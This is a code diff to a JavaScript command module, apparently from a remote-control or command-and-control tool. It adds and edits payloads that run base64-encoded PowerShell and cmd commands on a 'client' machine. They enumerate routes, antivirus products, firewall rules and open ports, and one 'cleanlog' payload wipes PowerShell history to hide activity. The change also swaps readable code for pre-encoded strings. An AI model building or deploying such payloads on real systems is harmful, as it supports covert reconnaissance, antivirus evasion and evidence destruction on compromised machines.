@@ -31,7 +31,7 @@ module.exports = {
         routeinfo: {
             name: 'routeinfo',
             method: 'payload-ps',
-            description: `Returns the routes info of the client.`,
+            description: `Returns the network routes open on the client.`,
             handler: (props) => {
                 return `R2V0LU5ldFJvdXRlIHwgU2VsZWN0LU9iamVjdCBEZXN0aW5hdGlvblByZWZpeCwgTmV4dEhvcCwgUm91dGVNZXRyaWMsIEludGVyZmFjZUFsaWFzLCBBZGRyZXNzRmFtaWx5LCBTdGF0ZSB8IENvbnZlcnRUby1Kc29u`;
             }
@@ -63,7 +63,7 @@ module.exports = {
         antivirus: {
             name: 'antivirus',
             method: 'payload-ps',
-            description: `Get the current antivirus`,
+            description: `Returns the current antivirus product installed.`,
             handler: (props) => {
                 return `R2V0LUNpbUluc3RhbmNlIC1OYW1lc3BhY2UgInJvb3QvU2VjdXJpdHlDZW50ZXIyIiAtQ2xhc3NOYW1lIEFudGlWaXJ1c1Byb2R1Y3Q=`;
             }
@@ -71,9 +71,33 @@ module.exports = {
         cleanlog: {
             name: 'cleanlog',
             method: 'payload-ps',
-            description: 'Cleans the powershell history and logs',
+            description: 'Cleans the powershell history and logs.',
             handler: () => {
-                return Buffer.from(`Clear-History | [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()`).toString('base64');
+                return `Q2xlYXItSGlzdG9yeSB8IFtNaWNyb3NvZnQuUG93ZXJTaGVsbC5QU0NvbnNvbGVSZWFkTGluZV06OkNsZWFySGlzdG9yeSgp`;
+            }
+        },
+        fwrules: {
+            name: 'fwrules',
+            method: 'payload-cmd',
+            description: 'Return all firewall rules including their status and configurations.',
+            handler: () => {
+                return `bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2hvdyBydWxlIG5hbWU9YWxs`;
+            }
+        },
+        fwprofile: {
+            name: 'fwprofile',
+            method: 'payload-cmd',
+            description: 'Return the status of all firewall profiles (Domain, Private, Public).',
+            handler: () => {
+                return `bmV0c2ggYWR2ZmlyZXdhbGwgc2hvdyBhbGxwcm9maWxlcw==`
+            }
+        },
+        ports: {
+            name: 'ports',
+            method: 'payload-ps',
+            description: 'Returns all open ports on the client.',
+            handler: () => {
+                return `R2V0LU5ldFRDUENvbm5lY3Rpb258U2VsZWN0LU9iamVjdCBMb2NhbEFkZHJlc3MsTG9jYWxQb3J0LFN0YXRl`;
             }
         }
     }
